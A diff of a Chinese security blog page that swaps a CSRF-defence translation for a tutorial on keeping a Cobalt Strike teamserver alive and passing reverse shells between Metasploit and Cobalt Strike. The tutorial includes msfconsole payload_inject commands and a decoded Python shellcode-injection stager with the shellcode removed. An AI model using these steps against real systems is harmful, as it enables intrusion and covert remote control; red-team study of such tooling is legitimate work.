@@ -15,17 +15,26 @@
 
 
 
-<meta name="description" content="其实是为迎战第二天英语竞赛而翻译的文章_(:з」∠)_">
+<meta name="description" content="‮">
 <meta property="og:type" content="article">
-<meta property="og:title" content="用Origin请求头防御CSRF攻击(译文)">
-<meta property="og:url" content="0sec.com.cn/2019-04-13/index.html">
+<meta property="og:title" content="Cobaltstrike Server持久化 &amp; Cobaltstrike与Metasploit相互派生shell">
+<meta property="og:url" content="0sec.com.cn/2019-10-31/index.html">
 <meta property="og:site_name" content="Cosmic Fragments">
-<meta property="og:description" content="其实是为迎战第二天英语竞赛而翻译的文章_(:з」∠)_">
+<meta property="og:description" content="‮">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-17T07:05:09.771Z">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20191101210837.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20191016141154.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20191101210308.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20191101210428.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20191101171437.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20191031142243.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20191031142447.png">
+<meta property="og:image" content="http://0blog.test.upcdn.net/20191101213459.png">
+<meta property="og:updated_time" content="2019-11-22T05:46:29.929Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="用Origin请求头防御CSRF攻击(译文)">
-<meta name="twitter:description" content="其实是为迎战第二天英语竞赛而翻译的文章_(:з」∠)_">
+<meta name="twitter:title" content="Cobaltstrike Server持久化 &amp; Cobaltstrike与Metasploit相互派生shell">
+<meta name="twitter:description" content="‮">
+<meta name="twitter:image" content="http://0blog.test.upcdn.net/20191101210837.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +66,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>用Origin请求头防御CSRF攻击(译文) | Cosmic Fragments</title>
+<title>Cobaltstrike Server持久化 &amp; Cobaltstrike与Metasploit相互派生shell | Cosmic Fragments</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -216,11 +225,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-用Origin请求头防御CSRF攻击" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Cobaltstrike-Server持久化-Cobaltstrike与Metasploit相互派生shell" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019-04-13/" class="article-date">
-      <time datetime="2019-04-13T06:33:33.000Z" itemprop="datePublished">2019-04-13</time>
+      <a href="/2019-10-31/" class="article-date">
+      <time datetime="2019-10-31T05:44:26.000Z" itemprop="datePublished">2019-10-31</time>
 </a>
 
 
@@ -235,7 +244,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      用Origin请求头防御CSRF攻击(译文)
+      Cobaltstrike Server持久化 &amp; Cobaltstrike与Metasploit相互派生shell
     </h1>
   
 
@@ -252,42 +261,90 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>其实是为迎战第二天英语竞赛而翻译的文章_(:з」∠)_<br><a id="more"></a></p>
-<blockquote>
-<p>原文链接：<a href="http://www.sjoerdlangkemper.nl/2019/02/27/prevent-csrf-with-the-origin-http-request-header/" target="_blank" rel="noopener">http://www.sjoerdlangkemper.nl/2019/02/27/prevent-csrf-with-the-origin-http-request-header/</a></p>
-</blockquote>
-<p>HTTP请求中的Origin请求头表示请求的来源，可以对防御跨站请求伪造攻击起到作用。</p>
-<h2 id="跨站请求"><a href="#跨站请求" class="headerlink" title="跨站请求"></a>跨站请求</h2><p>有些跨站请求是正常的，比如从另一个域调用图片等。但你一定不想将包含一些信息的认证请求呈现给另一个域，也就是CSRF。确定哪个页面发出请求对于积极防御CSRF攻击是很有用的，如果一个站点能确定请求来自哪里，它就能过滤请求。Referer头会包含这个信息但它是不可靠的，Origin头才是将这个信息添加到请求的可靠方式。</p>
-<h2 id="Referer请求头"><a href="#Referer请求头" class="headerlink" title="Referer请求头"></a>Referer请求头</h2><p>Referer头是一个较古老的请求头，包含了用户来源URL，当你点击一个链接时，当前页面的URL会被发送到这个链接。也就是说，这可以用于确定用户来自哪里，从而帮助我们阻止跨站请求。然而Referer头存在两个问题。</p>
-<p>第一，Referer头不够详尽。哪个请求应该发送Referer，甚至究竟是否该发送这个请求头都未被清楚说明。即使大多数浏览器确实发送了这个请求头，它们也并没有这样做的依据。</p>
-<p>第二，Referer请求头会泄露整个URL给别的域。如果URL包含一些session token或其他敏感数据，用户点击链接发送的Referer头将会将这些数据发送出去。这也是为什么许多反病毒方案会将HTTP请求中的Referer请求头直接去掉，以防止URL泄露敏感数据，因此我们并不能依赖Referer头。</p>
-<h2 id="Origin请求头"><a href="#Origin请求头" class="headerlink" title="Origin请求头"></a>Origin请求头</h2><p>Origin请求头只包含URL的格式、主机名和端口，也就避免了URL参数泄露给其他主机，虽然仍旧可以看出请求的来源。请求头看起来大概像这样：</p>
-<pre><code>Origin: https://www.sjoerdlangkemper.nl
-</code></pre><p>根据说明文档，HTTP请求可以包含多个Origin头，虽然我还没见过浏览器这样使用。还存在一个特殊的<code>null</code>值来表明这个来源是不可靠的。</p>
-<h3 id="null值"><a href="#null值" class="headerlink" title="null值"></a>null值</h3><p>如果文本不存在清晰的源，或请求根本不可信，不需要考虑源，null就可以用来表示。</p>
-<blockquote>
-<p>在一些情况下，字符串”null”会替代来源信息被发出，这样做是为了表明请求是不可信的，即使它是同源请求。某些请求在变化的触发条件下[…]未必总有用，而且可能并不可信，即使来自同一个源。</p>
-</blockquote>
-<p>浏览器会使用null Origin，比如iframe + data URL的例子：</p>
-<pre><code>&lt;iframe src=&quot;data:text/html,&lt;form method=&quot;POST&quot;...
-</code></pre><p>现代浏览器认为Data URLs是唯一不透明的源而不是继承包含页面的源。这说明data URL的源从不可靠，而null Origin就是被用来表明这一点的。</p>
-<h2 id="浏览器差异"><a href="#浏览器差异" class="headerlink" title="浏览器差异"></a>浏览器差异</h2><p>即使Origin的文档描述了这个请求头并且指明了一些用法，它也并没有定义好什么时候包含Origin头或Origin的期望值。Chrome和Firefox都在JavaScript POST请求中包含了Origin头，这些请求的行为和其他都不相同。Origin请求头被包含在：</p>
-<ul>
-<li>Chrome的所有POST表单，Firefox的则没有</li>
-<li>Firefox的所有JavaScript Fetch请求，Chrome中不包含HEAD和GET</li>
-<li>跨域重定向，Firefox使用来源域作为Origin而Chrome使用null Origin</li>
-</ul>
-<p>用这个<a href="https://demo.sjoerdlangkemper.nl/origin.php" target="_blank" rel="noopener">样例页面</a>观察你的浏览器行为。</p>
-<p>这些差异使得目前origin请求头的使用比较有限，不能依赖Origin头呈现在特定种类请求中，也就限制了防御的深度：在它呈现时检测它，但不要依赖它。</p>
-<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>检测Origin请求头是一个良好的额外防御跨站请求伪造及相关攻击的方式，虽然它已经被应用在浏览器中，但他的行为定义还没有完善到能依赖Origin头在特定请求中呈现。</p>
-<h2 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h2><ul>
-<li><a href="https://bugzilla.mozilla.org/show_bug.cgi?id=446344" target="_blank" rel="noopener">Bug 446344 - Implement Origin header CSRF mitigation</a></li>
-<li><a href="https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/10482384/" target="_blank" rel="noopener">Issue #10482384 - Send “Origin” HTTP header on POST form submit</a></li>
-<li><a href="https://seclab.stanford.edu/websec/csrf/csrf.pdf" target="_blank" rel="noopener">Robust Defenses for Cross-Site Request Forgery (PDF)</a></li>
-<li><a href="https://datatracker.ietf.org/doc/rfc6454/" target="_blank" rel="noopener">RFC6454 - The Web Origin Concept</a></li>
-<li><a href="https://wiki.mozilla.org/Security/Origin" target="_blank" rel="noopener">Origin header on Mozilla wiki</a></li>
-<li><a href="https://stackoverflow.com/questions/42239643/when-does-firefox-set-the-origin-header-to-null-in-post-requests" target="_blank" rel="noopener">When does Firefox set the Origin header to null in POST requests?</a></li>
-</ul>
+        <p>‮<br><a id="more"></a></p>
+<h2 id="Cobaltstrike-teamserver持久化"><a href="#Cobaltstrike-teamserver持久化" class="headerlink" title="Cobaltstrike teamserver持久化"></a>Cobaltstrike teamserver持久化</h2><p><img src="http://0blog.test.upcdn.net/20191101210837.png" alt=""></p>
+<p>由于我们在终端中的操作都属于SSH进程的子进程，当网络中断或SSH连接断开时，终端会收到HUP(hangup)信号从而关闭所有子进程。为了使Cobaltstrike的服务端保持唤醒，我们需要：a</p>
+<ol>
+<li>让进程忽略HUP信号；</li>
+<li>让进程运行在新的会话里，成为不属于此终端的子进程。</li>
+</ol>
+<p>一般来说，第一种思路可以<code>nohup</code>命令实现，结尾加上”&amp;”可将命令放入后台运行:</p>
+<pre><code>[root@Fazx ~]# nohup ping 0sec.com.cn &amp;
+[1] 3059
+nohup: appending output to `nohup.out&#39;
+[root@Fazx ~]# ps -ef | grep 3059
+root      3059   984  0 21:06 pts/3    00:00:00 ping 0sec.com.cn
+</code></pre><p>第二种思路则对应<code>setsid</code>命令：</p>
+<pre><code>[root@Fazx ~]# setsid ping 0sec.com.cn
+[root@Fazx ~]# ps -ef | grep 0sec.com.cn
+root     31094     1  0 20:28 ?        00:00:00 ping 0sec.com.cn
+</code></pre><p>可以看到进程ID（PID）为31094，而它的父ID（PPID）为1（即init进程ID），并不是当前终端的进程ID。</p>
+<p>此外，将命令与<code>&amp;</code>放在<code>()</code>中执行也可以实现<code>setsid</code>相同的效果：</p>
+<pre><code>[root@Fazx ~]# (ping 0sec.com.cn &amp;)
+[root@Fazx ~]# ps -ef | grep 0sec.com.cn
+root     3998     1  0 20:37 pts/4    00:00:00 ping 0sec.com.cn
+</code></pre><p>而为了避免大量命令的重复操作，或某一条命令忘记附加命令等情况，本文重点推荐使用<strong>screen工具</strong>实现需求，它可以方便地模拟出多个终端窗口，并将所有进程挂到init的子进程(即思路2)。话不多说来看操作：</p>
+<pre><code># 首先安装screen
+apt-get install screen
+</code></pre><p>输入<code>screen</code>新建一个窗口，在此窗口中直接正常输入命令，完成后使用<strong>Ctrl+A+D组合键</strong>将窗口放入后台执行，可以看到有会话为脱离状态：</p>
+<p><img src="http://0blog.test.upcdn.net/20191016141154.png" alt=""></p>
+<p>使用<code>screen -ls</code>查看后台窗口，<code>screen -r ID</code>恢复指定会话：</p>
+<pre><code>screen -r 14662
+</code></pre><p>同样的，Metasploit监听端口等待反弹shell时，也可以用这种方式进行持久化，操作相对于<code>nohup</code>要方便得多。</p>
+<h2 id="MSF派生shell给Cobaltstrike"><a href="#MSF派生shell给Cobaltstrike" class="headerlink" title="MSF派生shell给Cobaltstrike"></a>MSF派生shell给Cobaltstrike</h2><p><img src="http://0blog.test.upcdn.net/20191101210308.png" alt=""></p>
+<p>获取MSF shell、建立session后在meterpreter执行<code>background</code>将会话放到后台，切换payload。</p>
+<p>拥有MSF shell的攻击机与搭建Cobaltstrike的服务端不需要是同一台主机，端口相通即可实现远程派生shell。</p>
+<pre><code>msf exploit(handler) &gt;  use exploit/windows/local/payload_inject
+msf exploit(payload_inject) &gt; set PAYLOAD windows/meterpreter/reverse_http
+msf exploit(payload_inject) &gt; set DisablePayloadHandler true
+msf exploit(payload_inject) &gt; set LHOST [Listener监听IP]
+msf exploit(payload_inject) &gt; set LPORT [Listener监听端口]
+msf exploit(payload_inject) &gt; set SESSION [session ID]
+msf exploit(payload_inject) &gt; exploit
+</code></pre><p>配置<code>set DisablePayloadHandler true</code>的原因是payload_inject执行之后会在本地产生一个新的handler，而我们之前已经有了一个，不需要再生成。</p>
+<p>多个session同时建立时可以列举所有session并按需选择想要派生的shell：</p>
+<p><img src="http://0blog.test.upcdn.net/20191101210428.png" alt=""></p>
+<p>CS端配置如下监听器：</p>
+<pre><code>windows/beacon_http/reverse_http
+</code></pre><p>CS端肉鸡上线成功：</p>
+<p><img src="http://0blog.test.upcdn.net/20191101171437.png" alt=""></p>
+<h2 id="Cobaltstrike派生shell给MSF"><a href="#Cobaltstrike派生shell给MSF" class="headerlink" title="Cobaltstrike派生shell给MSF"></a>Cobaltstrike派生shell给MSF</h2><p>在CS获得一个beacon shell后，配置监听器</p>
+<pre><code>windows/foreign/reverse_tcp
+</code></pre><p>注意由于要与之后MSF的<code>windows/meterpreter/reverse_tcp</code>配置保持一致，这里是<code>reverse_tcp</code>而不再是<code>reverse_http</code>，同样的，配置IP与端口也应与MSF的监听保持一致。</p>
+<p>提前在MSF设置<code>exploit/multi/handler</code>对反向TCP连接的监听，这一步比较常规不再赘述。对需要派生的目标右击选择Spawn，之后选择对应的监听器。</p>
+<p><img src="http://0blog.test.upcdn.net/20191031142243.png" alt=""></p>
+<p>另一端MSF稍后即获取到shell连接，获得Meterpreter会话：</p>
+<p><img src="http://0blog.test.upcdn.net/20191031142447.png" alt=""></p>
+<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>有什么需要派生shell的场景呢？首先CS虽然强大但用于攻击的载荷模块并不如MSF丰富，可参考的资料也较少，此时需要MSF接手shell继续进行后续渗透流程；其次CS的肉鸡类型主要支持Windows平台，payload也面向Windows，这一点我们可以查看CS生成的<code>Scripted Web Delivery</code>中python类型的载荷，解码后如下(略去shellcode)：</p>
+<pre><code>import ctypes
+import platform
+
+(arch, type) = platform.architecture()
+
+# 32-bit Python
+if arch == &quot;32bit&quot;:
+    shellcode = &quot;xxxx&quot;
+
+# 64-bit Python
+elif arch == &quot;64bit&quot;:
+    shellcode = &quot;xxxx&quot; 
+else:
+    shellcode = &quot;&quot;
+
+# sanity check our situation
+if type != &quot;WindowsPE&quot; or len(shellcode) == 0:
+    quit()
+
+# inject our shellcode
+rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
+ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
+handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
+ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
+</code></pre><p>可以看到攻击代码中判断了WindowsPE，也就只能直接获取Windows shell。但通过派生shell我们可以使用MSF针对Linux的攻击载荷，获取Linux权限后接管到CS平台，从而拓展了团队协作渗透的广度与深度。</p>
+<hr>
+<p>Cobaltstrike核心的功能还是后渗透阶段，免杀、内网中的横向移动、内网转发、C2配置文件等，后续的文章也会围绕这些内容进行展开。</p>
+<p>写本文时值万圣节，Metasploit也更换了主题banner：</p>
+<p><img src="http://0blog.test.upcdn.net/20191101213459.png" alt=""></p>
 
       
     </div>
@@ -299,16 +356,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019-05-14/">
-                    Android开发实践之计算器&amp;记事助手
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019-04-07/">
-                    PHP中的随机数安全问题
+                <a href="/2019-08-21/">
+                    深入了解子域名挖掘tricks
                 </a>
             </div>
         
@@ -320,7 +371,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#跨站请求"><span class="toc-number">1.</span> <span class="toc-text">跨站请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Referer请求头"><span class="toc-number">2.</span> <span class="toc-text">Referer请求头</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Origin请求头"><span class="toc-number">3.</span> <span class="toc-text">Origin请求头</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null值"><span class="toc-number">3.1.</span> <span class="toc-text">null值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#浏览器差异"><span class="toc-number">4.</span> <span class="toc-text">浏览器差异</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结论"><span class="toc-number">5.</span> <span class="toc-text">结论</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#相关阅读"><span class="toc-number">6.</span> <span class="toc-text">相关阅读</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cobaltstrike-teamserver持久化"><span class="toc-number">1.</span> <span class="toc-text">Cobaltstrike teamserver持久化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF派生shell给Cobaltstrike"><span class="toc-number">2.</span> <span class="toc-text">MSF派生shell给Cobaltstrike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cobaltstrike派生shell给MSF"><span class="toc-number">3.</span> <span class="toc-text">Cobaltstrike派生shell给MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后话"><span class="toc-number">4.</span> <span class="toc-text">后话</span></a></li></ol>
         
     </div>
     <style>
@@ -356,7 +407,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"用Origin请求头防御CSRF攻击(译文)　| Cosmic Fragments　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"Cobaltstrike Server持久化 & Cobaltstrike与Metasploit相互派生shell　| Cosmic Fragments　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -376,15 +427,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019-05-14/" title="上一篇: Android开发实践之计算器&amp;记事助手">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2019-04-07/" title="下一篇: PHP中的随机数安全问题">
+            <a href="/2019-08-21/" title="下一篇: 深入了解子域名挖掘tricks">
                 <i class="fa fa-angle-right"></i>
             </a>
         
